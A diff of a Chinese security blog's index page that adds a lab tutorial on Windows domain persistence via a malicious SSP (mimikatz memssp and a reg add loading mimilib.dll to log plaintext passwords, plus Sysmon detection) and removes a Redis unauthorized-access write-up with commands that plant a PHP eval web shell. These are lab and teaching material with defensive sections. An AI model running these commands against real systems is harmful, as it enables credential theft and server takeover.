@@ -119,7 +119,7 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">54</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">58</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
@@ -129,7 +129,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">26</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">28</span></a>
 
   </li>
   </ul>
@@ -155,6 +155,243 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="name" content="swanQ">
+      <meta itemprop="description" content="让自己去触碰安全的blue sky">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SwanQ's Blue SKY">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/" class="post-title-link" itemprop="url">域渗透维权之Skeleton Key</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-07-14 10:19:55 / 修改时间：10:20:47" itemprop="dateCreated datePublished" datetime="2021-07-14T10:19:55+08:00">2021-07-14</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>签</p>
+<h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>咱今儿来看看单纯的维权，如果拿到了目标机器的system权限，可以利用SSP进行提权。其基础环境如下：</p>
+<table>
+<thead>
+<tr>
+<th align="center">IP</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">192.168.221.139</td>
+<td align="center">DC</td>
+</tr>
+<tr>
+<td align="center">192.168.221.140</td>
+<td align="center">域成员</td>
+</tr>
+</tbody></table>
+<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><h2 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h2><p><strong>SSP</strong>：Security Support Provider，直译为安全支持提供者，<strong>注册表中为Security Package</strong>.SSP就是一个用来实现身份认证的DLL</p>
+<p><strong>SSPI</strong>：Security Support Provider Interface，直译为安全支持提供程序接口，是<strong>Windows系统在执行认证操作所使用的API</strong>。SSPI是SSP的API接口</p>
+<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/blog/source/_posts/1.png"></p>
+<p><strong>lsass.exe</strong> ：作为Windows的系统进程，用于本地安全和登录策略;<strong>系统启动时，SSP 将被加载到lsass.exe进程中</strong>。</p>
+<p><strong>LSA</strong> ：Local Security Authority，用于身份验证; 且可进行扩展。</p>
+<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>因为LSA是可扩展的，所以可以自定义恶意dll,在系统启动时加载到lsass.exe进程中，就可获取lsass.exe中的明文密码。即使用户更改密码并重新登录，攻击者依然可疑获取其新密码。</p>
+<p>主要有两种攻击方式，体现于0x02和0x03</p>
+<h1 id="0x02-memssp加载到内存："><a href="#0x02-memssp加载到内存：" class="headerlink" title="0x02 memssp加载到内存："></a>0x02 memssp加载到内存：</h1><p><strong>原理：</strong>主要通过往lsass进程注入代码来patch其加载的msv1_0.dll中的<strong>SpAcceptCredentials</strong>函数来恢复凭据信息。</p>
+<p><strong>功能：</strong>在登录的过程中获取用户的明文密码并存储在system32的mimilsa.log中。此攻击不会在二进制系统中留下二进制文件，一旦域控重启，注入代码就会失效。</p>
+<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/blog/source/_posts/5.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure>
+
+<p>当<strong>系统重启</strong>再次进行身份验证的时候，会在System32目录下创建mimilsa.log</p>
+<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/blog/source/_posts/4.png"></p>
+<h1 id="0x03-SSP中加载mimilib-dll"><a href="#0x03-SSP中加载mimilib-dll" class="headerlink" title="0x03 SSP中加载mimilib.dll"></a>0x03 SSP中加载mimilib.dll</h1><p><strong>原理：</strong>mimikatz自带mimilib.dll也实现了SSP功能，mimikatz利用AddSecurityPackage此API来加载SSP，可在不重启的情况下添加mimilib.dll。</p>
+<p>该dll包含SpLsaModelntialize导出函数，lsass.exe会使用该函数来初始化包含多个回调函数的一个结构体，其中回调函数SpAcceptCredentials用来接收LSA传递的明文凭据</p>
+<h2 id="操作："><a href="#操作：" class="headerlink" title="操作："></a>操作：</h2><h3 id="添加SSP"><a href="#添加SSP" class="headerlink" title="添加SSP"></a>添加SSP</h3><p>将mimikatz提供的mimilib.dll复制到c:\windows\system32，与lsass进程位置相同，以便获取访问受感染主机的任何用户的登陆凭证</p>
+<h3 id="设置SSP"><a href="#设置SSP" class="headerlink" title="设置SSP"></a>设置SSP</h3><p>修改DC注册表HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages\</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#修改注册表项</span><br><span class="line">reg add &quot;hklm\system\currentcontrolset\control\lsa\&quot; &#x2F;v &quot;Security Packages&quot; &#x2F;d &quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&quot; &#x2F;t REG_MULTI_SZ</span><br><span class="line">#查看注册表项是否注入恶意dll</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/blog/source/_posts/2.png"></p>
+<p>重启系统，当域用户再次进行身份验证时-锁屏并打开，将System32目录下创建kiwissp文件，记录用户账户及明文密码</p>
+<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/blog/source/_posts/3.png"></p>
+<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><ul>
+<li>加载到内存：必须重新登录，重新启动后不会存在</li>
+<li>ssp中加载dll：必须重启，永久有效</li>
+</ul>
+<h1 id="0x05-检测及清理"><a href="#0x05-检测及清理" class="headerlink" title="0x05 检测及清理"></a>0x05 检测及清理</h1><h2 id="1-检测"><a href="#1-检测" class="headerlink" title="1.检测"></a>1.检测</h2><h3 id="memssp"><a href="#memssp" class="headerlink" title="memssp:"></a>memssp:</h3><ul>
+<li><p>只能通过sysmon监控到mimilsa.log创建的日志</p>
+<p>sysmon检测创建文件事件-事件11</p>
+<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/blog/source/_posts/6.png"></p>
+</li>
+</ul>
+<h3 id="SSP中加载mimilib-dll："><a href="#SSP中加载mimilib-dll：" class="headerlink" title="SSP中加载mimilib.dll："></a>SSP中加载mimilib.dll：</h3><ul>
+<li><p>sysmon4622事件：记录了lsass进程加载mimilib的过程</p>
+</li>
+<li><p>sysmon11事件：mimilib落盘</p>
+</li>
+<li><p>sysmon13事件：注册表修改</p>
+</li>
+<li><p>sysmon7事件：dll加载</p>
+</li>
+</ul>
+<h2 id="2-防御清除："><a href="#2-防御清除：" class="headerlink" title="2.防御清除："></a>2.防御清除：</h2><h3 id="memssp-1"><a href="#memssp-1" class="headerlink" title="memssp:"></a>memssp:</h3><ul>
+<li>查看Windows\System32下是否有mimilsa.log文件</li>
+<li>使用ARK工具查看msv1_0.dll是否已经被inlinehook(修改函数体实现)</li>
+</ul>
+<h3 id="mimilib-dll加载"><a href="#mimilib-dll加载" class="headerlink" title="mimilib.dll加载:"></a>mimilib.dll加载:</h3><ul>
+<li>检测此位置是否加载恶意dll</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages\ </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>检测Windows\System32是否有kiwissp.log</li>
+</ul>
+<p>Autoruns可用来检测LSA，报告出dll的位置</p>
+<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
+<li></li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/07/13/%E7%AE%80%E5%8D%95%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="name" content="swanQ">
+      <meta itemprop="description" content="让自己去触碰安全的blue sky">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SwanQ's Blue SKY">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/07/13/%E7%AE%80%E5%8D%95%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/" class="post-title-link" itemprop="url">简单恶意样本分析初探</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-07-13 16:38:30" itemprop="dateCreated datePublished" datetime="2021-07-13T16:38:30+08:00">2021-07-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-07-14 10:08:16" itemprop="dateModified" datetime="2021-07-14T10:08:16+08:00">2021-07-14</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>209</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在复现SSP攻击的时候遇到了dll文件的分析，听说web学习到后期一定是二进制，那今天就来敲敲二进制的大门吧，如果文章中有不对的地方，敬请指出</p>
+<p>检验样本哈希</p>
+<p>　<img src="/2021/07/13/%E7%AE%80%E5%8D%95%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/1.png"></p>
+<p>查壳：文件由Visual C++所写，无壳</p>
+<p>　<img src="/2021/07/13/%E7%AE%80%E5%8D%95%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/2.png"></p>
+<p>参考：</p>
+<ol>
+<li>IDA使用：<a target="_blank" rel="noopener" href="https://z3r3f.gitee.io/2019/02/15/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/">https://z3r3f.gitee.io/2019/02/15/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/</a></li>
+</ol>
+<p>问题：</p>
+<ol>
+<li>导入表</li>
+<li>资源表</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -190,7 +427,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-07-13 16:34:17" itemprop="dateModified" datetime="2021-07-13T16:34:17+08:00">2021-07-13</time>
+                <time title="修改时间：2021-07-14 10:24:39" itemprop="dateModified" datetime="2021-07-14T10:24:39+08:00">2021-07-14</time>
               </span>
 
           
@@ -216,7 +453,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>咱今儿来看看单纯的维权，如果拿到了目标机器的system权限，可以利用SSP进行提权。其基础环境如下：</p>
+          <h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>咱今儿来看看单纯的维权，如果拿到了目标机器的system权限，可以利用SSP进行维权。其基础环境如下：</p>
 <table>
 <thead>
 <tr>
@@ -1261,385 +1498,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/author.jpg">
-      <meta itemprop="name" content="swanQ">
-      <meta itemprop="description" content="让自己去触碰安全的blue sky">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="SwanQ's Blue SKY">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">redis未授权总结</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-06-04 22:32:04" itemprop="dateCreated datePublished" datetime="2021-06-04T22:32:04+08:00">2021-06-04</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-07-05 13:51:58" itemprop="dateModified" datetime="2021-07-05T13:51:58+08:00">2021-07-05</time>
-              </span>
-
-          
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>2.6k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前总结过的内容被自己的windows defender杀掉了，现哭着再总结一次。起因源于之前参加hvv遇到此洞，故而作此总结。</p>
-<h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>用ANSI  C写的redis作为非关系型内存数据库，是key-value存储系统，且支持主从服务器同步。redis漏洞产生的原因一般是：</p>
-<ul>
-<li><strong>直接暴露在公网</strong>：绑定在 <code>0.0.0.0:6379</code>，且没有进行添加防火墙规则、避免其他非信任来源IP访问等相关安全策略</li>
-<li><strong>没有设置密码认证</strong>(一般为空)：可以免密远程登录redis服务</li>
-</ul>
-<p>漏洞可能产生的危害:</p>
-<p>攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以通过恶意执行flushall来清空所有数据<br>攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件<br>如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害者服务器</p>
-<p>下图为redis拿shell的三种方式及其条件：</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/2.jpg"></p>
-<h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><p>靶机：Ubuntu 192.168.140.129</p>
-<p>攻击机：kali 192.168.140.130</p>
-<p>kali一键安装redis，sudo apt install redis</p>
-<p>Ubuntu debian或其他环境安装指南：</p>
-<p>安装：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf redis-6.0.1.tar.gz</span><br><span class="line">mv redis-6.0.1 /usr/local/redis</span><br><span class="line">cd /usr/local/redis</span><br><span class="line">make &amp; make install</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 任意目录启动</span></span><br><span class="line">cp redis-server /usr/bin</span><br><span class="line">cp redis-cli /usr/bin</span><br><span class="line">cp redis.conf /etc</span><br></pre></td></tr></table></figure>
-
-<p>配置：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 去掉仅对内网开放，加#</span><br><span class="line"># bind 127.0.0.1</span><br><span class="line"># redis关闭守护进程</span><br><span class="line">daemonize no</span><br><span class="line"># 关闭保护模式</span><br><span class="line">protected-mode no</span><br><span class="line"></span><br><span class="line"># 重启配置文件</span><br><span class="line">redis-server redis.conf</span><br><span class="line"># 关闭防火墙</span><br><span class="line">ufw disable</span><br></pre></td></tr></table></figure>
-
-<p>当然，别忘了，ubuntu要启动redis-server服务。</p>
-<p>为保证后面写入计划任务，此处以root权限启动redis</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/10.png"></p>
-<h1 id="0x03-利用方式"><a href="#0x03-利用方式" class="headerlink" title="0x03 利用方式"></a>0x03 利用方式</h1><h2 id="1-写webshell"><a href="#1-写webshell" class="headerlink" title="1. 写webshell"></a>1. 写webshell</h2><h3 id="条件："><a href="#条件：" class="headerlink" title="条件："></a><strong>条件：</strong></h3><p>存在web目录</p>
-<p>晓得绝对路径</p>
-<p>当然还要有写入权限</p>
-<h3 id="流程："><a href="#流程：" class="headerlink" title="流程："></a><strong>流程：</strong></h3><p>实际渗透过程中，这个方法通常需要搭配 phpinfo 等信息使用</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h  192.168.140.129 or 域名</span><br><span class="line">config set dir /var/www/html/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置写入文件</span></span><br><span class="line">config set dbfilename 1.php</span><br><span class="line"><span class="meta">#</span><span class="bash"> 以键值对的形式写入一句话木马</span></span><br><span class="line">set webshell &quot;&lt;?php @eval($_POST[&#x27;swanq&#x27;]);?&gt;&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 保存写入硬盘</span></span><br><span class="line">save </span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/1.png"></p>
-<p>最后用蚁剑连接即可：<code>http://192.168.127.139/1.php</code></p>
-<h2 id="2-写ssh公钥"><a href="#2-写ssh公钥" class="headerlink" title="2. 写ssh公钥"></a>2. 写ssh公钥</h2><p>原理：Redis 未授权访问通过写 <code>/root/.ssh</code>下的authorized_keys 来拿权限</p>
-<h3 id="条件：-1"><a href="#条件：-1" class="headerlink" title="条件："></a><strong>条件：</strong></h3><p>对外开启ssh服务</p>
-<p>Redis 服务运行在 root 用户下（否则还要猜测用户）</p>
-<h3 id="流程：-1"><a href="#流程：-1" class="headerlink" title="流程："></a><strong>流程：</strong></h3><p>生成本机ssh公私钥</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/2.png"></p>
-<p>为防止脏数据污染公钥，在公钥内容上下加空行。之后将公钥写入key.txt</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/3.png"></p>
-<blockquote>
-<p>shell的echo :</p>
-<p>用于字符串输出，其注意事项如下图所示：</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/7.png"></p>
-</blockquote>
-<p>redis远程连接靶机，将公钥文件key.txt写入靶机</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/4.png"></p>
-<blockquote>
-<p>-x：read last argument from STDIN</p>
-<p>cat key.txt | redis -h 192.168.140.129 -x set crack：</p>
-<ul>
-<li><p>cat key.txt 输出 作为后面的输入</p>
-</li>
-<li><p>-x 读取标准输入</p>
-</li>
-<li><p>set crack 是将读取的输入作为crack此参数内容</p>
-<p>相当于把参数crack参数和-x读的数据组了个命令执行</p>
-</li>
-</ul>
-</blockquote>
-<p>找到靶机redis备份路径：</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/8.png"></p>
-<p>更改redis备份路径为ssh公钥存放目录/home/glory/.ssh,默认情况为/root/.ssh。并设置上传公钥文件名为authorized_keys</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/5.png"></p>
-<blockquote>
-<p>config:可查看或设置配置项</p>
-<p>dbfilename:备份文件</p>
-</blockquote>
-<p>SSH远程登陆成功</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/6.png"></p>
-<h2 id="3-在crontab中写定时任务"><a href="#3-在crontab中写定时任务" class="headerlink" title="3. 在crontab中写定时任务"></a>3. 在crontab中写定时任务</h2><h3 id="条件：-2"><a href="#条件：-2" class="headerlink" title="条件："></a>条件：</h3><p>有可写计划任务的权限,将文件写入到计划目录下执行</p>
-<p>多见于CentOs使用</p>
-<h3 id="流程：-2"><a href="#流程：-2" class="headerlink" title="流程："></a>流程：</h3><p>攻击机监听本机9999端口，接收之后的反弹shell</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/9.png"></p>
-<p>利用redis以root权限运行有可写计划任务的权限，写crontab</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/11.png"></p>
-<blockquote>
-<p>1./var/spool/cron目录存储每个用户生成的crontab文件</p>
-<p>2.直接往当前用户的crontab中写反弹shell，必须要换行</p>
-<p>3.* * * * * myCommand：1分钟执行一次myCommand</p>
-<p>4.n个数大于2，否则文件内容里面的任务计划会出现乱码导致命令执行失败</p>
-</blockquote>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/12.png"></p>
-<p>观察到此时并无反弹shell。但是确实写入成功。</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/13.png"></p>
-<p>具体排查问题另起一篇博客说明。</p>
-<h1 id="0x02-如何防护"><a href="#0x02-如何防护" class="headerlink" title="0x02 如何防护"></a>0x02 如何防护</h1><h4 id="1-禁止远程使用一些高危命令"><a href="#1-禁止远程使用一些高危命令" class="headerlink" title="1.禁止远程使用一些高危命令"></a>1.禁止远程使用一些高危命令</h4><p>我们可以通过修改redis.conf文件来禁用远程修改DB文件地址</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG   &quot;&quot;</span><br><span class="line">rename-command EVAL     &quot;&quot;</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-低权限运行Redis服务"><a href="#2-低权限运行Redis服务" class="headerlink" title="2.低权限运行Redis服务"></a>2.低权限运行Redis服务</h4><p>为Redis服务创建单独的<code>user</code>和<code>home</code>目录，并且配置禁止登陆</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-为Redis添加密码验证"><a href="#3-为Redis添加密码验证" class="headerlink" title="3.为Redis添加密码验证"></a>3.为Redis添加密码验证</h4><p>我们可以通过修改redis.conf文件来为Redis添加密码验证</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requirepass mypassword</span><br></pre></td></tr></table></figure>
-
-<h4 id="4-禁止外网访问-Redis"><a href="#4-禁止外网访问-Redis" class="headerlink" title="4.禁止外网访问 Redis"></a>4.禁止外网访问 Redis</h4><p>我们可以通过修改redis.conf文件来使得Redis服务只在当前主机可用</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
-<li>下载链接：<a target="_blank" rel="noopener" href="http://download.redis.io/releases/redis-6.0.1.tar.gz">http://download.redis.io/releases/redis-6.0.1.tar.gz</a></li>
-<li><a target="_blank" rel="noopener" href="https://hejueyun.github.io/posts/2218125b/">https://hejueyun.github.io/posts/2218125b/</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/223432.html">https://www.freebuf.com/vuls/223432.html</a></li>
-<li>redis相关：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241146">https://www.anquanke.com/post/id/241146</a></li>
-<li>corntab命令参考：<a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html">https://www.runoob.com/w3cnote/linux-crontab-tasks.html</a></li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/05/28/VulnHub-GoldenEye/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/author.jpg">
-      <meta itemprop="name" content="swanQ">
-      <meta itemprop="description" content="让自己去触碰安全的blue sky">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="SwanQ's Blue SKY">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/05/28/VulnHub-GoldenEye/" class="post-title-link" itemprop="url">VulnHub靶机系列：GoldenEye渗透Writeup</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-05-28 16:50:10" itemprop="dateCreated datePublished" datetime="2021-05-28T16:50:10+08:00">2021-05-28</time>
-            </span>
-              <span class="post-meta-item">
